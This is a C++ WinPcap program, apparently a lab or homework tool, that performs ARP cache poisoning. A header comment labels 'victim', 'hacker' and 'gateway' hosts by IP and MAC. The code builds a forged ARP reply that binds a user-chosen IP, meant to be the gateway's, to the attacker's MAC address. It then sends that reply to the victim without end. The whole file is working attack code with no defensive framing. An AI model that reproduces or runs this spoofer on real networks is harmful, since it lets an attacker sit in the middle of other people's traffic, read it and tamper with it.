/***********************************
victim
192.168.32.186
48-45-20-81-1F-91

hacker
192.168.32.206
48-45-20-81-20-1D

gateway
192.168.32.254
2c-21-72-93-df-00
************************************/


#include <iostream>   
#include <pcap.h>   
#include <remote-ext.h>   
#include <windows.h>   
#include <stdio.h>   
#include <Iphlpapi.h> 
#include <WinSock2.h>
#include <stdlib.h>

#pragma comment(lib,"Iphlpapi.lib")   
#pragma comment(lib,"wpcap")   
#pragma comment(lib,"WS2_32.lib")   

#define MALLOC(x) HeapAlloc(GetProcessHeap(), 0, (x))
#define FREE(x) HeapFree(GetProcessHeap(), 0, (x))

using namespace std;

char ipsc[20], ipse[20];
in_addr se;
in_addr sc;
u_char packet[100];
void ipsc_input();
void ipse_input();


int main()
{


	PIP_ADAPTER_INFO pAdapterInfo;
	PIP_ADAPTER_INFO pAdapter = NULL;
	DWORD dwRetVal = 0;
	UINT j;

	struct tm newtime;
	char buffer[32];
	errno_t error;

	pcap_if_t *alldevs;
	pcap_if_t *d;
	int inum;
	int i = 0;
	int count;
	char errbuf[PCAP_ERRBUF_SIZE];

	pcap_t *fp;

	unsigned char   g_ucLocalMac[6];
	ULONG ulLen = 0;

	ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
	pAdapterInfo = (IP_ADAPTER_INFO *)MALLOC(sizeof(IP_ADAPTER_INFO));
	if (pAdapterInfo == NULL) {
		printf("Error allocating memory needed to call GetAdaptersinfo\n");
		return 1;
	}

	if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
		FREE(pAdapterInfo);
		pAdapterInfo = (IP_ADAPTER_INFO *)MALLOC(ulOutBufLen);
		if (pAdapterInfo == NULL) {
			printf("Error allocating memory needed to call GetAdaptersinfo\n");
			return 1;
		}
	}

	if ((dwRetVal = GetAdaptersInfo(pAdapterInfo, &ulOutBufLen)) == NO_ERROR) {
		pAdapter = pAdapterInfo;
		printf("\t\n");
			printf("\tAdapter Name: \t%s\n", pAdapter->AdapterName);
			printf("\tAdapter Desc: \t%s\n", pAdapter->Description);
			printf("\tAdapter Addr: \t");
			for (j = 0; j < pAdapter->AddressLength; j++) {
				if (j == (pAdapter->AddressLength - 1))
					printf("%.2X\n", (int)pAdapter->Address[j]);
				else
					printf("%.2X-", (int)pAdapter->Address[j]);
			}
			printf("\tIP Address: \t%s\n",
				pAdapter->IpAddressList.IpAddress.String);
			printf("\tGateway: \t%s\n", pAdapter->GatewayList.IpAddress.String);
			printf("\t\n");

				pAdapter = pAdapter->Next;
				printf("\n");

		}
		else {
			printf("GetAdaptersInfo failed with error: %d\n", dwRetVal);

		}
		if (pAdapterInfo)
			FREE(pAdapterInfo);

		::GetAdaptersInfo(pAdapterInfo, &ulLen);
		pAdapterInfo = (PIP_ADAPTER_INFO)::GlobalAlloc(GPTR, ulLen);


		if (::GetAdaptersInfo(pAdapterInfo, &ulLen) == ERROR_SUCCESS)
		{
			if (pAdapterInfo != NULL)
			{
				memcpy(g_ucLocalMac, pAdapterInfo->Address, 6);
			}
		}
		u_char *p = g_ucLocalMac;

		/* Retrieve the device list on the local machine */
		if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldevs, errbuf) == -1)
		{
			fprintf(stderr, "Error in pcap_findalldevs: %s\n", errbuf);
			exit(1);
		}

		/* Print the list */
		for (d = alldevs; d; d = d->next)
		{
			printf("%d. %s", ++i, d->name);
			if (d->description)
				printf(" (%s)\n", d->description);
			else
				printf(" (No description available)\n");
		}

		if (i == 0)
		{
			printf("\nNo interfaces found\n");
			return -1;
		}

		printf("Enter the interface number (1~%d):", i);
		scanf("%d", &inum);

		if (inum < 1 || inum > i)
		{
			printf("\nInterface number out of range.\n");
			pcap_freealldevs(alldevs);
			return -1;
		}

		/* Jump to the selected adapter */
		for (d = alldevs, i = 0; i < inum - 1; d = d->next, i++);


		/* Open the output device */
		if ((fp = pcap_open(d->name,            // name of the device   
			100,                // portion of the packet to capture (only the first 100 bytes)   
			PCAP_OPENFLAG_PROMISCUOUS,  // promiscuous mode   
			1000,               // read timeout   
			NULL,               // authentication on the remote machine   
			errbuf              // error buffer   
		)) == NULL)
		{
			fprintf(stderr, "\nUnable to open the adapter. %s is not supported by WinPcap\n", d->name);
			return -1;
		}

		pcap_freealldevs(alldevs);

		/* Supposing to be on ethernet */
		
		packet[0] = 0x48;
		packet[1] = 0x45;
		packet[2] = 0x20;
		packet[3] = 0x81;
		packet[4] = 0x1F;
		packet[5] = 0x91;

		/* set mac source */
		packet[6] = 0x48;
		packet[7] = 0x45;
		packet[8] = 0x20;
		packet[9] = 0x81;
		packet[10] = 0x20;
		packet[11] = 0x1D;

		/* set type 08-06 Arp */
		packet[12] = 8;
		packet[13] = 6;

		/* Fill the Arp packet */
		//hardware type 10M   
		packet[14] = 0;
		packet[15] = 1;
		//protocol type 08-00 IP   
		packet[16] = 8;
		packet[17] = 0;
		//Length of hardware address 6bytes   
		packet[18] = 6;
		//Length of protocal address 4bytes   
		packet[19] = 4;
		//operation code 00-01 Arp request / 00-02 Arp reply   
		packet[20] = 0;
		packet[21] = 2;
		//sender's mac address
		packet[22] = 0x48;
		packet[23] = 0x45;
		packet[24] = 0x20;
		packet[25] = 0x81;
		packet[26] = 0x20;
		packet[27] = 0x1D;
		//sender's IP address
		ipsc_input();
		//target mac address
		packet[32] = 0x48;
		packet[33] = 0x45;
		packet[34] = 0x20;
		packet[35] = 0x81;
		packet[36] = 0x1F;
		packet[37] = 0x91;
		//target's IP address
		ipse_input();    

		/* Send down the packet */
		//for (count = 0; count < 10000; count++) {
		while(1){
			if (pcap_sendpacket(fp, packet, 42 /* size */) != 0)
			{
				fprintf(stderr, "\nError sending the packet: \n", pcap_geterr(fp));
				return -1;
			}
		
		}
		return 0;
	}

		void ipsc_input()
		{
			cout << "Source ip£º";
			cin >> ipsc;
			sc.S_un.S_addr = inet_addr(ipsc);
			packet[28] = sc.S_un.S_un_b.s_b1;
			packet[29] = sc.S_un.S_un_b.s_b2;
			packet[30] = sc.S_un.S_un_b.s_b3;
			packet[31] = sc.S_un.S_un_b.s_b4;
		}
		void ipse_input()
		{
			int j;
			cout << "target ip : ";
			cin >> ipse;
			se.S_un.S_addr = inet_addr(ipse);
			packet[38] = se.S_un.S_un_b.s_b1;
			packet[39] = se.S_un.S_un_b.s_b2;
			packet[40] = se.S_un.S_un_b.s_b3;
			packet[41] = se.S_un.S_un_b.s_b4;

			for (j = 42; j < 100; j++)
			{
				packet[j] = j % 256;
			}

		}

